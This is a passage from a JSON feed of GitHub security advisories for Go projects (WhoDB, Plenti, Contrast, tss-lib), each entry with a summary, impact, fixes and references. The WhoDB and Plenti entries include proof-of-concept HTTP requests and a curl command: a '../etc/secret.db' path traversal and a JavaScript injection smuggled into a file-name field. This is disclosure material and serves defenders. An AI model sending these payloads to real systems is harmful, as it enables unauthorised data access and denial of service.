href=\"https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c\">https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c</a></li>\n<li><a href=\"https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1\">https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24787\">https://nvd.nist.gov/vuln/detail/CVE-2025-24787</a></li>\n<li><a href=\"https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128\">https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c7w4-9wv8-7x7c\">https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c7w4-9wv8-7x7c",
            "title": "[github.com/clidey/whodb/core] WhoDB allows parameter injection in DB connection URIs leading to local file inclusion",
            "date_modified": "2025-02-07T17:35:25.000Z",
            "date_published": "2025-02-06T19:58:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c7w4-9wv8-7x7c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>While the application only displays Sqlite3 databases present in the directory <code>/db</code>, there is no path traversal prevention in place. This allows an unauthenticated attacker to open any Sqlite3 database present on the host machine that the application is running on.</p>\n<h3 id=\"details\">Details</h3>\n<p>WhoDB allows users to connect to Sqlite3 databases. By default, the databases must be present in <code>/db/</code> (or alternatively <code>./tmp/</code> if development mode is enabled). Source: <a href=\"https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20\">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></p>\n<p>If no databases are present in the default directory, the UI indicates that the user is unable to open any databases:</p>\n<p><img alt=\"2025-01-22-12-12-42\" src=\"https://github.com/user-attachments/assets/98ffbcf6-907d-4f90-bf11-2c921b2d93b3\"></p>\n<p>The database file is an user-controlled value. This value is used in <code>.Join()</code> with the default directory, in order to get the full path of the database file to open. Source: <a href=\"https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26\">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></p>\n<p>No checks are performed whether the database file that is eventually opened actually resides in the default directory <code>/db</code>.</p>\n<p>This allows an attacker to use path traversal (<code>../../</code>) in order to open any Sqlite3 database present on the system. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Before running the container, an example Sqlite3 database with dummy \"secret\" data was created:</p>\n<pre><code class=\"language-sh\">DB_FILE=$(mktemp)\necho \"CREATE TABLE secret_table (data TEXT); INSERT INTO secret_table VALUES ('secret data')\" | sqlite3 \"$DB_FILE\"\n</code></pre>\n<p>The container was then created with nothing mounted into <code>/db</code>, and the dummy database mounted into <code>/etc/secret.db</code>:</p>\n<pre><code class=\"language-sh\">podman run -d -p 8080:8080 -v \"$DB_FILE\":/etc/secret.db docker.io/clidey/whodb\n</code></pre>\n<p>The attacker sends a HTTP request to determine whether the <code>secret.db</code> is accessible by setting the <code>Database</code> value to <code>../etc/secret.db</code>:</p>\n<pre><code class=\"language-http\">POST /api/query HTTP/1.1\nHost: localhost:8080\ncontent-type: application/json\n...\n\n{\"operationName\":\"Login\",\"variables\":{\"credentials\":{\"Type\":\"Sqlite3\",\"Hostname\":\"\",\"Database\":\"../etc/secret.db\",\"Username\":\"\",\"Password\":\"\",\"Advanced\":[]}},\"query\":\"mutation Login($credentials: LoginCredentials!) {\\n  Login(credentials: $credentials) {\\n    Status\\n    __typename\\n  }\\n}\"}\n</code></pre>\n<p>The server response indicates that the database was successfully opened:</p>\n<pre><code class=\"language-http\">HTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: Token=eyJUeXBlIjoiU3FsaXRlMyIsIkhvc3RuYW1lIjoiIiwiVXNlcm5hbWUiOiIiLCJQYXNzd29yZCI6IiIsIkRhdGFiYXNlIjoiLi4vZXRjL3NlY3JldC5kYiJ9; Path=/; Expires=Thu, 23 Jan 2025 10:35:43 GMT; HttpOnly\n...\n\n{\"data\":{\"Login\":{\"Status\":true,\"__typename\":\"StatusResponse\"}}}\n</code></pre>\n<p>The <code>Set-Cookie</code> <code>Token</code> value is simply a Base64-encoded string with a JSON payload containing the connection details:</p>\n<pre><code class=\"language-json\">{\n  \"Type\": \"Sqlite3\",\n  \"Hostname\": \"\",\n  \"Username\": \"\",\n  \"Password\": \"\",\n  \"Database\": \"../etc/secret.db\"\n}\n</code></pre>\n<p>The attacker may set this cookie in the browser manually (alongside corresponding profiles in Local Storage) in order to open this database in the WhoDB application graphically. An easy way to perform this is by using a HTTP proxy such as Burp Suite, intercepting the login request and swapping the <code>Database</code> value to <code>../etc/secret.db</code>.</p>\n<p>Doing so, the attacker can then browse the database, its tables and the data within:</p>\n<p><img alt=\"2025-01-22-12-36-25\" src=\"https://github.com/user-attachments/assets/c28f1273-7a3c-49e8-bb73-d08a09c7521d\"></p>\n<p>The attacker may also insert or modify data using either the buttons presented in the UI or the <em>Scratchpad</em> functionality. In this proof-of-concept, the attacker inserts a new row using the <em>Add Row</em> button:</p>\n<p><img alt=\"2025-01-22-12-36-49\" src=\"https://github.com/user-attachments/assets/dbd86beb-9969-464c-9a28-a19d470d0f52\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Allows an unauthenticated attacker to open and read any Sqlite3 databases present on the system WhoDB is running on. If WhoDB has write permissions for the database file, the attacker is also able to modify the opened database.</p>\n<p>The attacker is unable to create new databases; however, files which already exist but have no content (0-length files) may be opened and modified as fresh databases.</p>\n<h3 id=\"recommendations\">Recommendations</h3>\n<p>Before attempting to open the database, resolve and normalize the path to the database and check whether it is in the default directory. If not, present the user with an error.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76\">https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76</a></li>\n<li><a href=\"https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc\">https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24786\">https://nvd.nist.gov/vuln/detail/CVE-2025-24786</a></li>\n<li><a href=\"https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20\">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></li>\n<li><a href=\"https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26\">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9r4c-jwx3-3j76\">https://github.com/advisories/GHSA-9r4c-jwx3-3j76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9r4c-jwx3-3j76",
            "title": "[github.com/clidey/whodb/core] WhoDB has a path traversal opening Sqlite3 database",
            "date_modified": "2025-02-07T17:35:14.000Z",
            "date_published": "2025-02-06T19:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9r4c-jwx3-3j76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>While pushing a file via postLocal method if user add javascript code in file parameter that codes can exe in v8go context.</p>\n<h3 id=\"details\">Details</h3>\n<p>While posting a file via postLocal, any attacker will add javascript codes to file parameter. That parameter content pass to componentSignature method after some validation. After that componentSignature parameter concat with ssrStr parameter.</p>\n<img src=\"https://github.com/user-attachments/assets/a08a3fe5-2fbd-4a05-b93c-2ad127e6ee81\" alt=\"image\" width=\"1145\">\n\n<p>Last part of compileSvelte function ssrStr parameter executed in v8go engine.</p>\n<img src=\"https://github.com/user-attachments/assets/4e622761-3324-48d6-8264-6dd6e09055af\" alt=\"image\" width=\"754\">\n\n<p>This cause to any one who can post a file also can push javascript code and run it. Thanks to v8go we can't use all javascript metod, if there is no any vulnerability in v8go we can't escape sandbox and can't run dangerous command like opening socket etc. But we can create infinite loop and the plenti can't response any request.</p>\n<p>After posting a file with name 'layouts/global/test; eval(<code>while(1);</code>);var test.svelte' we can see the ssrStr parameter include our javascript codes.</p>\n<img src=\"https://github.com/user-attachments/assets/369c7820-ff8a-4b9a-9cd3-6b0692f1dcf3\" alt=\"image\" width=\"1023\">\n\n<p><strong>Note</strong>: Eval usage not must I just want to ensure that it's run javascript commands.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><strong>Request</strong></p>\n<pre><code>POST /postlocal HTTP/1.1\nHost: localhost:3000\nContent-Length: 125\nContent-Type: application/json; charset=utf-8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n[{\"action\":\"create\",\"encoding\":\"text\",\"file\":\"layouts/global/test; eval(`while(1);`);var test.svelte\",\"contents\":\"anethole\"}]\n</code></pre>\n<p><strong>Video</strong>\n<img alt=\"PoC\" src=\"https://github.com/user-attachments/assets/2aca36a1-6989-4be8-a8d1-3b12960f3e9b\"></p>\n<p><strong>Curl Request</strong></p>\n<pre><code>curl --path-as-is -i -s -k -X $'POST' \\\n    -H $'Host: localhost:3000' -H $'Content-Length: 125' -H $'Content-Type: application/json; charset=utf-8' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \\\n    --data-binary $'[{\\\"action\\\":\\\"create\\\",\\\"encoding\\\":\\\"text\\\",\\\"file\\\":\\\"layouts/global/test; eval(`while(1);`);var test.svelte\\\",\\\"contents\\\":\\\"anethole\\\"}]' \\\n    $'http://localhost:3000/postlocal'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>It's a remote code execution vulnerability. Because of the sandbox we can show only Denial of Service impact. Any vulnerability will be exists in v8go that cause to escape sandbox, different impacts can be show.</p>\n<p><strong>Note:</strong> Plenti is using V8GO and V8GO is using V8 version of 11.1.278. This version released at 25 January 2023. After this date some RCE vulnerabilities founded in V8 like <a href=\"https://github.com/advisories/GHSA-fchp-8m28-g68f\">CVE-2024-5830</a>,</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5\">https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5</a></li>\n<li><a href=\"https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e\">https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2025-3454\">https://pkg.go.dev/vuln/GO-2025-3454</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mj4v-hp69-27x5\">https://github.com/advisories/GHSA-mj4v-hp69-27x5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mj4v-hp69-27x5",
            "title": "[github.com/plentico/plenti] Plenti  - Code Injection - Denial of Services",
            "date_modified": "2025-02-06T18:05:42.000Z",
            "date_published": "2025-02-05T21:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mj4v-hp69-27x5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Recovering coordinators do not verify the seed provided by the recovering party. This allows an attacker to set up a coordinator with a manifest that passes validation, but with a secret seed controlled by the attacker. </p>\n<p>If network traffic is redirected from the legitimate coordinator to the attacker's coordinator, a workload owner is susceptible to impersonation if either </p>\n<ul>\n<li>they <code>set</code> a new manifest and don't compare the root CA cert with the existing one (this is the default of the <code>contrast</code> CLI) or</li>\n<li>they <code>verify</code> the coordinator and don't compare the root CA cert with a trusted reference.</li>\n</ul>\n<p>Under these circumstances, the attacker can:</p>\n<ul>\n<li>Issue certificates that chain back to the attacker coordinator's root CA.</li>\n<li>Recover arbitrary workload secrets of workloads deployed after the attack.</li>\n</ul>\n<p>This issue does <strong>not</strong> affect the following:</p>\n<ul>\n<li>secrets of the legitimate coordinator (seed, workload secrets, CA)</li>\n<li>integrity of workloads, even when used with the rogue coordinator</li>\n<li>certificates chaining back to the mesh CA</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is patched in Contrast v1.4.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The issue can be avoided by verifying the coordinator root CA cert against expectations.</p>\n<ul>\n<li>At the first <code>set</code> call, keep a copy of the CA cert returned by the coordinator.</li>\n<li>After subsequent <code>set</code> or <code>verify</code> calls, compare the returned CA cert with the backup copy. If it matches bit-for-bit, the coordinator is legitimate.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/edgelesssys/contrast/security/advisories/GHSA-vqv5-385r-2hf8\">https://github.com/edgelesssys/contrast/security/advisories/GHSA-vqv5-385r-2hf8</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2025-3455\">https://pkg.go.dev/vuln/GO-2025-3455</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqv5-385r-2hf8\">https://github.com/advisories/GHSA-vqv5-385r-2hf8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqv5-385r-2hf8",
            "title": "[github.com/edgelesssys/contrast] Contrast's unauthenticated recovery allows Coordinator impersonation",
            "date_modified": "2025-02-06T18:05:16.000Z",
            "date_published": "2025-02-05T21:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqv5-385r-2hf8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>io.finnet tss-lib before 2.0.0 can leak the lambda value of a private key via a timing side-channel attack because it relies on Go big.Int, which is not constant time for Cmp, modular exponentiation, or modular inverse. An example leak is in crypto/paillier/paillier.go. (bnb-chain/tss-lib and thorchain/tss are also affected.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-26557\">https://nvd.nist.gov/vuln/detail/CVE-2023-26557</a></li>\n<li><a href=\"https://github.com/IoFinnet/tss-lib/releases/tag/v2.0.0\">https://github.com/IoFinnet/tss-lib/releases/tag/v2.0.0</a></li>\n<li><a href=\"https://github.com/bnb-chain/tss-lib/tree/v1.3.5\">https://github.com/bnb-chain/tss-lib/tree/v1.3.5</a></li>\n<li><a href=\"https://gitlab.com/thorchain/tss/tss-lib/-/tags/v0.1.3\">https://gitlab.com/thorchain/tss/tss-lib/-/tags/v0.1.3</a></li>\n<li><a href=\"https://medium.com/@iofinnet/security-disclosure-for-ecdsa-and-eddsa-threshold-signature-schemes-4e969af7155b\">https://medium.com/@iofinnet/security-disclosure-for-ecdsa-and-eddsa-threshold-signature-schemes-4e969af7155b</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2023-1733\">https://pkg.go.dev/vuln/GO-2023-1733</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mjqv-xhgm-gx8c\">https://github.com/advisories/GHSA-mjqv-xhgm-gx8c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mjqv-xhgm-gx8c",
            "title": "[github.com/binance-chain/tss-lib] IO FinNet tss-lib vulnerable to timing attack from non-constant time scalar arithmetic",
            "date_modified": "2025-02-05T19:43:34.000Z",
            "date_published": "2023-04-21T18:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mjqv-xhgm-gx8c"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}